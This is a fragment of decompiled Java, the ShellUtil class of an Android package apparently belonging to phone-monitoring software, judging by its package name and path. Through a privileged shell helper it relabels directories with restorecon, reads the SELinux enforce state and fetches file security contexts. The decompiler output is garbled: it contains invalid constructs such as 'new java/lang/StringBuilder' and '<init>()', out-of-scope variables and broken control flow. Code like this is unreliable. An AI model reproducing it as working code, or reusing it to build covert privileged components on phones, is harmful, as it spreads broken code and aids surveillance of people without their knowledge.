      localObject2 = new Object[i];
      localObject2[0] = paramString;
      localObject1 = String.format("restorecon # dir: %s", (Object[])localObject2);
      Log.v(str, (String)localObject1);
    }
    String str = "restorecon -FR %s";
    bool2 = true;
    try
    {
      localObject1 = new Object[bool2];
      i = 0;
      localObject2 = null;
      localObject1[0] = paramString;
      str = String.format(str, (Object[])localObject1);
      KMShell.a(str);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool2 = b;
        if (bool2)
        {
          localObject1 = "ShellUtil";
          localObject2 = "restoreconDir # Error!!";
          Log.e((String)localObject1, (String)localObject2, localException);
        }
      }
    }
    bool1 = a;
    if (bool1)
    {
      str = "ShellUtil";
      localObject1 = "restoreconDir # EXIT ...";
      Log.v(str, (String)localObject1);
    }
  }
  
  private static ShellUtil.SELinuxMode m()
  {
    ShellUtil.SELinuxMode localSELinuxMode = ShellUtil.SELinuxMode.UNKNOWN;
    String str1 = "cat /sys/fs/selinux/enforce";
    for (;;)
    {
      try
      {
        str1 = KMShell.a(str1);
        if (str1 != null)
        {
          int i = str1.length();
          if (i > 0) {
            continue;
          }
        }
      }
      finally
      {
        boolean bool2;
        boolean bool1 = b;
        if (!bool1) {
          continue;
        }
        String str2 = "ShellUtil";
        String str3 = "getRunningSELinuxModeMethod2 err ..";
        Log.e(str2, str3, localThrowable);
        continue;
      }
      return localSELinuxMode;
      str2 = "1";
      bool2 = str1.equalsIgnoreCase(str2);
      if (bool2) {
        localSELinuxMode = ShellUtil.SELinuxMode.ENFORCING;
      } else {
        localSELinuxMode = ShellUtil.SELinuxMode.PERMISSIVE;
      }
    }
  }
  
  public static String m(String paramString)
  {
    String str1 = "";
    Object localObject1 = "%s -lZ %s";
    int i = 2;
    try
    {
      localObject2 = new Object[i];
      int j = 0;
      str2 = null;
      String str3 = "/system/bin/ls";
      localObject2[0] = str3;
      j = 1;
      localObject2[j] = paramString;
      localObject1 = String.format((String)localObject1, (Object[])localObject2);
      localObject1 = KMShell.b((String)localObject1);
      localObject2 = "\\s+";
      localObject1 = ((String)localObject1).split((String)localObject2);
      i = localObject1.length;
      j = 5;
      if (i >= j)
      {
        i = 3;
        str1 = localObject1[i];
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject2;
        String str2;
        boolean bool2;
        boolean bool1 = b;
        if (bool1)
        {
          localObject2 = "ShellUtil";
          str2 = "getSecurityContext # Error!!";
          Log.e((String)localObject2, str2, localException);
        }
      }
    }
    bool2 = a;
    if (bool2)
    {
      localObject1 = "ShellUtil";
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      str2 = "getSecurityContext # context: ";
      localObject2 = str2 + str1;
      Log.v((String)localObject1, (String)localObject2);
    }
    return str1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/shell/ShellUtil.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */